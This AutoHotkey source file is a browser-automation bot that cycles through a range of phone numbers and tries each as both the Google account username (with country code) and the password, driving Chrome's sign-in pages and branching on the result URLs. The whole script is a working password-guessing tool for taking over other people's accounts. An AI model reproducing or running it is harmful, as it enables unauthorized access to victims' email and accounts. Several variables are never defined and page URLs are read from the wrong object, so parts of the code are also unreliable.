#NoEnv
#SingleInstance, Force
#Include %A_ScriptDir%\chrome.class.ahk
SetWorkingDir, %A_ScriptDir%
SetBatchLines, -1
;===================[ Usable Links ]==================;
ipapiUrl   = https://ipwho.is/?output=json&fields=ip,country_code,calling_code
loginUrl   = https://accounts.google.com/ServiceLogin?hl=en&continue=https://myaccount.google.com
gmailUrl   = https://mail.google.com/mail
googleacc  = https://gds.google.com/web/chip?
myaccount  = https://myaccount.google.com
identifier = https://accounts.google.com/v3/signin/identifier?
challenge  = https://accounts.google.com/v3/signin/challenge/pwd?

;===================[ Set Default INI File ]==================;
iniFile := A_ScriptDir "\" A_ScriptName ".ini"
if !FileExist(iniFile)
{
	Port := "5" . R(1111,9999)
	config := {}
	config.app := {Port:Port, Profile: "Default", Proxy:0, Thread:0, VPN:0}
	config.email := {CallingCode:0, FirstNumber:0, LastNumber:0, Pointer:0}
	InputBox, License, Activation key, Enter activation key., , 350, 130
	if ErrorLevel || strlen(License) < 3
		ExitApp
	Else{
		config.app.License := License
		Writeini(config,iniFile)
	}
}
;===================[ Initiate INI File ]==================;
CCCode := iR("CallingCode", "email", iniFile)
FPhone := iR("FirstNumber", "email", iniFile)
LPhone := iR("LastNumber", "email", iniFile)
if(!CCCode || CCCode > 10000){
	InputBox, CCCode, Country Calling Code, Plaese insert valid Country callingCode to continue.,, 350, 130
	Error := ErrorLevel ? 1 : iw(CCCode, "CallingCode", "email", iniFile)
}
if(!FPhone || FPhone < 100000){
	InputBox, FPhone, First Phone Number, Plaease insert valid phone number [Without AreaCode] to continue...,, 400, 130
	Error := ErrorLevel ? 1 : iw(FPhone, "FirstNumber", "email", iniFile)
}
if(!LPhone || LPhone <= FPhone){
	InputBox, LPhone, Last Phone Number, Plaease insert valid phone number [Without AreaCode] to continue...,, 400, 130
	Error := ErrorLevel ? 1 : iw(LPhone, "LastNumber", "email", iniFile)
}
if Error || (strlen(FPhone) != strlen(LPhone))
{
	MsgBox, 4, Invalid Input!, Valid input not fount! Please fix [%A_ScriptName%.ini] file & press [YES] to continue...`nPress [ON] to exit process.
	IfMsgBox Yes
		Reload
	else
		ExitApp
}
;===================[ Authorized App ]==================;
env := Readini(iniFile)
GoSub, GetPCInfo
Gosub, GetAuthorization
if !env.Authorized {
	MsgBox, 16, % "Invalid License key! Error: " env.auth.code, % env.auth.error "`nYour License key is not valid!", 30
	ExitApp
}
;===================[ Get Chrome Instance ]==================;
chrome := new Chrome(loginUrl, env.app.Profile, env.app.Port)
inPage := Chrome.GetPage()
inPage.WaitForLoad()
Sleep 1000
;===================[ Start Main Process Loop ]==================;
loop {
	IniRead, Pointer, % iniFile, email, Pointer
	if(!Pointer || Pointer < env.email.FirstNumber){
		Pointer := FPhone
		iw(Pointer, "Pointer", "email", iniFile)
	}
	else if( Pointer> LPhone ){
		MsgBox, 16, Process Complete, Process Complete.
		ExitApp
	}
	if !substr(FPhone,1,1) && substr(CCCode,strlen(CCCode),1)=substr(FPhone,1,1)
		Pointer := substr(Pointer,2,strlen(Pointer))
	USER := CCCode . Pointer
	PASS := Pointer
	
	MsgBox %USER%  %PASS%
	
	;===================[ Start Singlelogin Loop & check URL ]==================;
	Loop {
		
	
		;===================[ Login Process ]==================;
		if instr(env.debObj.url, identifier)=1 {
			if env.page=0 && inPage.Evaluate("$x('//input[@type=\'email\']').length").value {
				Sleep 500
				script = $x("//input[@type='email']")[0].value="%USER%"; $x("//span[text()='Next']")[0].click();
				inPage.Evaluate(script)
				inPage.WaitForLoad()
				Sleep 1000
				env.page:=1

				;'matrix(1, 0, 0, 1, -650.346, 0)'
				;getComputedStyle(document.querySelector('div[jsname=\'P1ekSe\']')).transform
				;getComputedStyle(document.querySelector('.sUoeld')).animation
			}
		}
		else if instr(env.debObj.url, challenge)=1 {
			if inPage.Evaluate("$x('//input[@type=\'password\']').length").value {
				Sleep 500
				script = $x("//input[@type='password']")[0].value="%PASS%"; $x("//span[text()='Next']")[0].click();
				inPage.Evaluate(script)
				inPage.WaitForLoad()
				Sleep 2000
			}
		}
		;===================[ Exception Handeling ]==================;
		else if instr(env.debObj.url,"/iap?") || instr(env.debObj.url,"/dp?") || instr(env.debObj.url,"/ipp?") {
			Sleep 1000
			Process, Close, % Chrome.PID
			Sleep 1000
			IniWrite, % posip+1, % inifile, email, posip
			IniWrite, % posemail+1, % inifile, email, posemail
			Break
		}
		else if instr(env.debObj.url,"challenge/selection?") || instr(env.debObj.url,"/selection?")  {
			Sleep 1000
			Process, Close, % Chrome.PID
			Sleep 1000
			IniWrite, % posemail+1, % inifile, email, posemail
			Break
		}
		else if instr(env.debObj.url,"/unknownerror?") || instr(env.debObj.url,"/ServiceLogin?") {
			inPage.Call("Page.navigate", {"url": loginUrl})
			inPage.WaitForLoad()
			Sleep 3000
			env.page:=0
		}
		else if instr(env.debObj.url,"/rejected?") {
			Sleep 1000
			Process, Close, % Chrome.PID
			Sleep 2000
			Break
		}
		;===================[ Logout & Restart for new login session ]==================;
		else if instr(env.debObj.url, "https://accounts.google.com/ServiceLogin/signinchooser")=1 {		;Success
			Process, Close, % Chrome.PID
			Sleep 2000
			IniWrite, % posip+1, % inifile, email, posip
			IniWrite, % posemail+1, % inifile, email, posemail
			Break
		}
		;===================[ Succesfull login session ]==================;
		else if instr(env.debObj.url, googleacc)=1 || instr(env.debObj.url, myaccount)=1 {
			Sleep 500
			inPage.Call("Page.navigate", {"url": language})
			inPage.WaitForLoad()
			Sleep 1000
			env.page:=4
		}
		;===================[ Solve Unknown Exception -TODO- ]==================;
		else {
			MsgBox % env.debObj.url
			Sleep 1000
		}
	}
}
Return
;===================[ Usefull Hotkeys ]==================;
^x::
	Process, Close, % Chrome.PID
	Sleep 1000
	ExitApp
return
^r::
	Process, Close, % Chrome.PID
	Sleep 1000
	Reload
return

;===================[ Labels ]==================;
ToolTips:
	ToolTip, % env.debObj.url
return

;------------------- Get PC Info ------------------;
GetPCInfo:
	pcinfo := {}
	if(Online()){
		http := ComObjCreate("WinHttp.WinHttpRequest.5.1")
		http.open("GET", ipapiUrl)
		http.send()
		env.debObj := chrome.Jxon_Load(http.responseText)
		;todo  if  proxy update calling code in ini
	}
	FormatTime, today,, yyyyMMdd
	env.pcinfo.today := today
return

;------------------- Authorization ------------------;
GetAuthorization:
	env.Authorized:=0
	pcuid := MachineKey(env.app.License)
	StringLower, app, A_ScriptName
	reqUri := "uid=" . pcuid . "&app=" . app . "&lic=" . env.app.License . "&name=" . A_UserName
	apikey := SHA1(env.app.License . pcuid)
	ResText := ApiReq("https://4io.info/api.php?", reqUri, apikey)
	;MsgBox % ResText
	env.auth := chrome.Jxon_Load(ResText)
	if env.auth.code && env.auth.app=app
	{
		if env.auth.code = 400 || env.auth.code = 404
		{
			MsgBox,16, % "Invalid License! Error: " env.auth.code, % env.auth.error "`nPlease contact your Administrator to get a valid License Key.", 30
			ExitApp
		}
		else if env.auth.code = 300 || env.auth.code = 303 || env.auth.code = 200
		{
			env.auth.Expire := trim(StrReplace(StrReplace(env.auth.token, SHA1(pcuid . env.app.License)), env.auth.License))
			if env.pcinfo.today < env.auth.Expire && env.auth.Expire=StrReplace(env.auth.Expire, "-")
				env.Authorized:=1
		}
	}
return

;===================[ Functions ]==================;
R(s,e){
   Random, r, s, e
   return r
}
;------- Read File by Line number -------;
readLine(file, line:=0){
	file := instr(file,":") ? file : A_ScriptDir "\" file
	FileRead, text, %file%
	return line ? StrSplit(text, "`n")[line] : StrSplit(text, "`n")
}

;------- Append File -------;
appendFile(fp,str){
	fp := instr(fp,":") ? fp : A_ScriptDir "\" fp
	FileAppend, % str . "`n", % fp
}

;------- Ini Read Single Value -------;
iR(key, sec, file:="config.ini"){
	file := instr(file,":") ? file : A_ScriptDir "\" file
	Sleep 100
	IniRead, val, %file%, %sec%, %key%
	return val
}

;------- Ini Write Single Value -------;
iW(val, key, sec, file:="config.ini"){
	file := instr(file,":") ? file : A_ScriptDir "\" file
	Sleep 100
	IniWrite, %val%, %file%, %sec%, %key%
	return val
}

;------- Write INI file from OBJECT -------;
Writeini(obj, file := "config.ini") {
	file := instr(file,":") ? file : A_ScriptDir "\" file
    for sec, arr in obj {
        Pairs := ""
        for key, val in arr
            Pairs .= key "=" val "`n"
        IniWrite, %Pairs%, %file%, %sec%
    }
}

;------- Read INI file to OBJECT -------;
Readini(file := "config.ini") {
	file := instr(file,":") ? file : A_ScriptDir "\" file
    IniRead, sections, %file%
    obj := {}
    for i, sec in StrSplit(sections, "`n") {
        IniRead, section, %file%, %sec%
        obj2 := {}
        for j, val in StrSplit(section, "`n") {
            part := StrSplit(val, "=",,2)
            obj2[part[1]] := part[2]
        }
        obj[sec] := obj2
    }
    return obj
}
;------- Parse -------;
Parse(d, f, s:="|"){
	keys  := StrSplit(f, s)
	vals  := StrSplit(d, s)
	ob := {}
	for k, v in keys
		ob[v] := trim(vals[k])
	return ob
}
;------- Online -------;
Online(flag=0x40){
    Return DllCall("Wininet.dll\InternetGetConnectedState", "Str", flag,"Int",0)
}
;------- ApiReq -------;
ApiReq(url, data:="", apikey=0){
	if !Online(){
		MsgBox, 16, "Internet connection error!", "Please check your internet connection and try again!"
		Return
	}
	whr := ComObjCreate("WinHttp.WinHttpRequest.5.1")
	if data && apikey
		whr.Open("POST", url)
	else
		whr.Open("GET", url)
	whr.SetRequestHeader("Content-Type", "application/x-www-form-urlencoded")
	if apikey
		whr.SetRequestHeader("X-API-KEY", apikey)
	whr.Send(data)
	whr.WaitForResponse()
	return whr.ResponseText
}
;------- MachineKey -------;
MachineKey(lic){
    keyfile := A_Temp "\" MD5(lic)
	StringLower, keyfile, keyfile
	if !FileExist(keyfile) {
		tempfile = %A_Temp%\%A_ScriptName%uid
		RunWait, %ComSpec% /c getmac /NH > %tempfile%,, Hide
		FileRead, uidtemp, % tempfile
		FileDelete, % tempfile
		macs =
		Loop, Parse, uidtemp, `n, `r
		{
			RegExMatch(A_LoopField, ".*?([0-9A-Z].{16})(?!\w\\Device)", mac)
			if(mac!="")
				macs .=  mac
		}
		appendFile(keyfile, MD5(StrReplace(macs, "-", "")))
	}else
		FileRead, pcuid, % keyfile
	return % pcuid
}
;===================[ Encodeing & Decoding Functions]===================;
MD5(ByRef V, L=0 ){
	VarSetCapacity( MD5_CTX,104,0 ), DllCall( "advapi32\MD5Init", Str,MD5_CTX )
	DllCall( "advapi32\MD5Update", Str,MD5_CTX, Str,V, UInt,L ? L : StrLen(V) )
	DllCall( "advapi32\MD5Final", Str,MD5_CTX )
	Loop % StrLen( Hex:="123456789ABCDEF0" )
	N := NumGet( MD5_CTX,87+A_Index,"Char"), MD5 .= SubStr(Hex,N>>4,1) . SubStr(Hex,N&15,1)
	Return MD5
}
SHA1(string, case := 0){
    static SHA_DIGEST_LENGTH := 20
    hModule := DllCall("LoadLibrary", "Str", "advapi32.dll", "Ptr")
    , VarSetCapacity(SHA_CTX, 136, 0), DllCall("advapi32\A_SHAInit", "Ptr", &SHA_CTX)
    , DllCall("advapi32\A_SHAUpdate", "Ptr", &SHA_CTX, "AStr", string, "UInt", StrLen(string))
    , DllCall("advapi32\A_SHAFinal", "Ptr", &SHA_CTX, "UInt", &SHA_CTX + 116)
    loop % SHA_DIGEST_LENGTH
        o .= Format("{:02" (case ? "X" : "x") "}", NumGet(SHA_CTX, 115 + A_Index, "UChar"))
    return o, DllCall("FreeLibrary", "Ptr", hModule)
}
B64decode(ByRef InData){
	DllCall( "Crypt32.dll\CryptStringToBinaryW", UInt,&InData, UInt,StrLen(InData), UInt,1, UInt,0, UIntP,Bytes, Int,0, Int,0, "CDECL Int" )
	VarSetCapacity( OutData, Req := Bytes * ( A_IsUnicode ? 2 : 1 ), 0 )
	DllCall( "Crypt32.dll\CryptStringToBinaryW", UInt,&InData, UInt,StrLen(InData), UInt,1, Str,OutData, UIntP,Req, Int,0, Int,0, "CDECL Int" )
	return StrGet(&OutData, "cp0")
}
B64encode(ByRef InData){
	InDataLen := StrPutVar(InData, InData, "UTF-8")-1
	DllCall( "Crypt32.dll\CryptBinaryToStringW", UInt,&InData, UInt,InDataLen, UInt,1, UInt,0, UIntP,TChars, "CDECL Int" )
	VarSetCapacity( OutData, Req := TChars * ( A_IsUnicode ? 2 : 1 ), 0 )
	DllCall( "Crypt32.dll\CryptBinaryToStringW", UInt,&InData, UInt,InDataLen, UInt,1, Str,OutData, UIntP,Req, "CDECL Int" )
	return OutData
}
StrPutVar(string, ByRef var, encoding){
    VarSetCapacity( var, StrPut(string, encoding) * ((encoding="utf-16"||encoding="cp1200") ? 2 : 1) )
    return StrPut(string, &var, encoding)
}
;===================[ End of Code ]===================;
